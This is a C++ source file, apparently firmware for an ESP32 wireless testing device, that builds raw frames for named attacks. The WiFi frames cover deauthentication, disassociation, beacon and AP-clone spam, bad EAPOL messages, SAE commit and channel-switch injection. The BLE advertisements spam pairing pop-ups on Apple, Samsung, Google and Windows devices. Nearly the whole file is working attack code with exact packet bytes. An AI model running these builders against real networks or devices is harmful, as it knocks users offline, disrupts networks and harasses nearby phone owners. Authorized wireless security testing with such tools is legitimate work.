// Independently bounded protocol builders informed by ESP32 Marauder's MIT
// WiFiScan implementation. See CREDITS.md and third_party/licenses/MARAUDER.txt.
#include "attack_frames.h"
#include "packet_helpers.h"
#include <string.h>
#include <stdio.h>

namespace dragon::tx {
const AttackDefinition attackDefinitions[] = {
  {"Named WiFi beacon",false,false,false},
  {"Random SSID beacons",false,false,false},
  {"SSID playlist",false,false,false},
  {"Clone full AP beacon",false,true,false},
  {"Probe requests",false,false,false},
  {"Authentication requests",false,true,false},
  {"Deauthentication",false,true,false},
  {"Disassociation",false,true,false},
  {"Active EAPOL capture",false,true,false},
  {"Bad EAPOL message",false,true,true},
  {"Association sleep",false,true,true},
  {"SAE commit",false,true,false},
  {"Channel switch (CSA)",false,true,false},
  {"Quiet announcement",false,true,false},
  {"BLE Swift Pair",true,false,false},
  {"BLE Google Fast Pair",true,false,false},
  {"BLE Samsung pairing",true,false,false},
  {"BLE Flipper adverts",true,false,false},
  {"BLE Apple Juice",true,false,false},
  {"BLE Sour Apple",true,false,false},
  {"BLE mixed pairing",true,false,false},
  {"AP clone / random BSSIDs",false,true,false},
  {"Rickroll beacon playlist",false,false,false},
  {"Funny beacon playlist",false,false,false},
  {"BLE iBeacon simulator",true,false,false},
  {"BLE Eddystone UID",true,false,false},
  {"BLE Eddystone telemetry",true,false,false},
  {"BLE BTHome sensor",true,false,false},
  {"BLE custom advertisement",true,false,false}
};
static_assert(sizeof(attackDefinitions)/sizeof(*attackDefinitions)==unsigned(AttackMode::Count));
bool unicastAddress(const uint8_t mac[6]) {
  if(!mac||(mac[0]&1))return false;
  uint8_t bits=0;for(unsigned i=0;i<6;++i)bits|=mac[i];return bits!=0;
}
bool parseMac(const char* text,uint8_t mac[6],bool requireUnicast){
  if(!text||!mac)return false;size_t n=strlen(text);if(n!=12&&n!=17)return false;uint8_t value[6];
  auto hex=[](char c){return c>='0'&&c<='9'?c-'0':c>='a'&&c<='f'?c-'a'+10:c>='A'&&c<='F'?c-'A'+10:-1;};
  for(unsigned i=0;i<6;++i){unsigned at=i*(n==17?3:2);int a=hex(text[at]),b=hex(text[at+1]);if(a<0||b<0||(n==17&&i<5&&text[at+2]!=':'))return false;value[i]=(a<<4)|b;}
  if(requireUnicast&&!unicastAddress(value))return false;memcpy(mac,value,6);return true;
}
bool validAttackTarget(AttackMode mode,const AttackTarget& t) {
  if(unsigned(mode)>=unsigned(AttackMode::Count))return false;
  const auto& d=attackDefinitions[unsigned(mode)];
  if(d.ble)return true;
  if(t.channel<1||t.channel>11||!memchr(t.ssid,0,sizeof(t.ssid)))return false;
  if(d.needsAp&&(!t.hasAp||!unicastAddress(t.bssid)))return false;
  if(t.hasClient&&!unicastAddress(t.client))return false;
  if(d.needsClient&&!t.hasClient)return false;
  if(mode==AttackMode::ChannelSwitch&&(t.destinationChannel<1||t.destinationChannel>11||t.destinationChannel==t.channel))return false;
  if((mode==AttackMode::Beacon||mode==AttackMode::SsidList||mode==AttackMode::CloneBeacon||mode==AttackMode::AssociationSleep)&&!*t.ssid)return false;
  return true;
}
static void le16(uint8_t* p,uint16_t value){p[0]=value;p[1]=value>>8;}
static void header(uint8_t* p,uint8_t fc,uint8_t flags,const uint8_t* dst,const uint8_t* src,const uint8_t* bssid,uint16_t seq) {
  memset(p,0,24);p[0]=fc;p[1]=flags;memcpy(p+4,dst,6);memcpy(p+10,src,6);memcpy(p+16,bssid,6);le16(p+22,(seq&4095)<<4);
}
size_t buildWifiAttack(uint8_t* out,size_t cap,AttackMode mode,const AttackTarget& t,
                      const uint8_t source[6],uint16_t seq,const uint8_t entropy[96]) {
  if(!out||!source||!entropy||!unicastAddress(source)||!validAttackTarget(mode,t)||attackDefinitions[unsigned(mode)].ble)return 0;
  // Construct into a bounded scratch area and copy only after size validation.
  uint8_t b[256]{};const uint8_t broadcast[]={255,255,255,255,255,255};
  const uint8_t* dst=t.hasClient?t.client:broadcast;size_t n=0;size_t ssidLen=strlen(t.ssid);
  switch(mode) {
    case AttackMode::Beacon:case AttackMode::RandomBeacons:case AttackMode::SsidList:case AttackMode::ApSpam:case AttackMode::Rickroll:case AttackMode::FunnyBeacons:
    case AttackMode::CloneBeacon:case AttackMode::ChannelSwitch:case AttackMode::Quiet: {
      char name[33];memcpy(name,t.ssid,sizeof(name));
      if(mode==AttackMode::RandomBeacons)snprintf(name,sizeof(name),"DD-%02X%02X%02X%02X",entropy[0],entropy[1],entropy[2],entropy[3]);
      if(mode==AttackMode::Rickroll){const char* names[]={"Rick Astley","Never Gonna Give You Up","Rickroll radio demo","youtu.be/dQw4w9WgXcQ"};snprintf(name,sizeof(name),"%s",names[seq%4]);}
      if(mode==AttackMode::FunnyBeacons){const char* names[]={"Wi Believe I Can Fi","404 Network Not Found","Packet Snack Bar","LAN Before Time","Router? I barely know her"};snprintf(name,sizeof(name),"%s",names[seq%5]);}
      const uint8_t* sender=attackDefinitions[unsigned(mode)].needsAp?t.bssid:source;
      n=makeBeacon(b,sizeof(b),sender,t.channel,*name?name:"Dragon-Lab");
      if(!n)return 0;le16(b+22,(seq&4095)<<4);
      if(mode==AttackMode::ChannelSwitch){const uint8_t ie[]={37,3,1,t.destinationChannel,1};memcpy(b+n,ie,sizeof(ie));n+=sizeof(ie);}
      if(mode==AttackMode::Quiet){const uint8_t ie[]={40,6,1,1,0xff,0x7f,0,0};memcpy(b+n,ie,sizeof(ie));n+=sizeof(ie);}
      break;
    }
    case AttackMode::Probe: {
      header(b,0x40,0,broadcast,source,broadcast,seq);b[24]=0;b[25]=ssidLen;memcpy(b+26,t.ssid,ssidLen);n=26+ssidLen;
      const uint8_t rates[]={1,8,0x82,0x84,0x8b,0x96,12,18,24,36};memcpy(b+n,rates,sizeof(rates));n+=sizeof(rates);break;
    }
    case AttackMode::Authentication:
      header(b,0xb0,0,t.bssid,source,t.bssid,seq);le16(b+26,1);n=30;break;
    case AttackMode::Deauthentication:case AttackMode::Disassociation:case AttackMode::ActiveEapol:
      if(t.hasClient&&(seq&1))header(b,mode==AttackMode::Disassociation?0xa0:0xc0,0,t.bssid,t.client,t.bssid,seq);
      else header(b,mode==AttackMode::Disassociation?0xa0:0xc0,0,dst,t.bssid,t.bssid,seq);
      le16(b+24,7);n=26;break;
    case AttackMode::BadMessage: {
      header(b,0x08,0x02,t.client,t.bssid,t.bssid,seq);
      const uint8_t llc[]={0xaa,0xaa,3,0,0,0,0x88,0x8e};memcpy(b+24,llc,sizeof(llc));
      b[32]=2;b[33]=3;b[35]=117;b[36]=2;b[38]=0xca;b[40]=16;
      b[47]=seq>>8;b[48]=seq;memcpy(b+49,entropy,32);b[130]=22;
      const uint8_t key[]={0xdd,20,0,0x0f,0xac,4};memcpy(b+131,key,sizeof(key));memcpy(b+137,entropy+32,16);n=153;break;
    }
    case AttackMode::AssociationSleep: {
      header(b,0,0x10,t.bssid,t.client,t.bssid,seq);le16(b+24,0x31);le16(b+26,10);b[28]=0;b[29]=ssidLen;memcpy(b+30,t.ssid,ssidLen);n=30+ssidLen;
      const uint8_t ies[]={1,4,0x82,0x84,0x8b,0x96,33,2,1,21,36,2,1,11,
        48,20,1,0,0,0x0f,0xac,4,1,0,0,0x0f,0xac,4,1,0,0,0x0f,0xac,2,0,0};
      memcpy(b+n,ies,sizeof(ies));n+=sizeof(ies);break;
    }
    case AttackMode::SaeCommit:
      // Caller supplies a valid group-19 scalar and X/Y point, not arbitrary bytes.
      header(b,0xb0,0,t.bssid,source,t.bssid,seq);le16(b+24,3);le16(b+26,1);le16(b+30,19);memcpy(b+32,entropy,96);n=128;break;
    default:return 0;
  }
  if(n>cap)return 0;memcpy(out,b,n);return n;
}
size_t copyBleAdvertisement(uint8_t* out,size_t cap,const uint8_t* data,size_t n){if(!out||!data||!n||n>31||n>cap||!validLegacyAdvert(data,n))return 0;memcpy(out,data,n);return n;}
size_t buildBleAttack(uint8_t* out,size_t cap,AttackMode mode,const uint8_t e[96]) {
  if(!out||!e)return 0;
  if(mode==AttackMode::BleMix)mode=AttackMode(unsigned(AttackMode::SwiftPair)+(e[0]%6));
  uint8_t b[31]{};size_t n=0;
  switch(mode) {
    case AttackMode::IBeacon: {
      const uint8_t data[]={2,1,6,26,0xff,0x4c,0,2,0x15,0x44,0x52,0x41,0x47,0x4f,0x4e,0x4c,0x41,0x42,0,0,0,0,0,0,1,0,1,0,1,0xc5};
      memcpy(b,data,sizeof(data));memcpy(b+25,e,4);n=sizeof(data);break;
    }
    case AttackMode::EddystoneUid: {
      const uint8_t data[]={2,1,6,3,3,0xaa,0xfe,23,0x16,0xaa,0xfe,0,0xc5,'D','r','a','g','o','n','-','L','a','b',0,0,0,0,0,0,0,0};
      memcpy(b,data,sizeof(data));memcpy(b+23,e,6);n=sizeof(data);break;
    }
    case AttackMode::EddystoneTlm: {
      const uint8_t data[]={2,1,6,3,3,0xaa,0xfe,17,0x16,0xaa,0xfe,0x20,0,0x0b,0xb8,0x19,0,0,0,0,1,0,0,0,1};
      memcpy(b,data,sizeof(data));b[14]=e[0];b[16]=e[1];memcpy(b+21,e+2,4);n=sizeof(data);break;
    }
    case AttackMode::BTHome: {
      const uint8_t data[]={2,1,6,11,0x16,0xd2,0xfc,0x40,0,0,1,100,2,0xc4,9,2,9,'D'};
      memcpy(b,data,sizeof(data));b[9]=e[0];b[11]=e[1]%101;n=sizeof(data);break;
    }
    case AttackMode::SwiftPair: {
      const uint8_t prefix[]={16,0xff,6,0,3,0,0x80};memcpy(b,prefix,sizeof(prefix));
      char name[11];snprintf(name,sizeof(name),"DD-%02X%02X%02X",e[0],e[1],e[2]);memcpy(b+7,name,9);b[0]=15;n=16;break;
    }
    case AttackMode::FastPair: {
      const uint8_t data[]={3,3,0x2c,0xfe,6,0x16,0x2c,0xfe,0,0xb7,0x27,2,0x0a,0};memcpy(b,data,sizeof(data));b[13]=uint8_t(-40+e[0]%21);n=sizeof(data);break;
    }
    case AttackMode::Samsung: {
      const uint8_t data[]={14,0xff,0x75,0,1,0,2,0,1,1,0xff,0,0,0x43,0x1a};memcpy(b,data,sizeof(data));
      static const uint8_t models[]={0x1a,0x1b,0x1c,0x1d,0x20,0x21};b[14]=models[e[0]%sizeof(models)];n=sizeof(data);break;
    }
    case AttackMode::Flipper: {
      const uint8_t data[]={2,1,6,6,9,'H','P','L','A','B',3,2,0x81,0x30,2,0x0a,0,9,0xff,0xba,0x0f,0x4c,0x75,0x67,0x26,0xe1,0x80};
      memcpy(b,data,sizeof(data));for(unsigned i=0;i<5;++i)b[5+i]='A'+e[i]%26;b[12]=0x81+e[5]%3;n=sizeof(data);break;
    }
    case AttackMode::AppleJuice: {
      const uint8_t data[]={20,0xff,0x4c,0,7,15,0,2,0x20,0xac,0x90,0x85,0x75,0x94,0x65,0,0,0,0,0,0};
      memcpy(b,data,sizeof(data));static const uint8_t models[]={2,0xf,0x13,0x14,0xe,0xa,0xc,0x11,5,0x10,9,0x17,0x12,0x16};b[7]=models[e[0]%sizeof(models)];memcpy(b+15,e+1,5);n=sizeof(data);break;
    }
    case AttackMode::SourApple: {
      const uint8_t data[]={10,0xff,0x4c,0,0x0f,5,0xc0,0x27,0,0,0};memcpy(b,data,sizeof(data));
      static const uint8_t actions[]={0x27,9,2,0x1e,0x2b,0x2f,1,6,0x20};b[7]=actions[e[0]%sizeof(actions)];memcpy(b+8,e+1,3);n=sizeof(data);break;
    }
    default:return 0;
  }
  if(n>cap||!validLegacyAdvert(b,n))return 0;memcpy(out,b,n);return n;
}
}

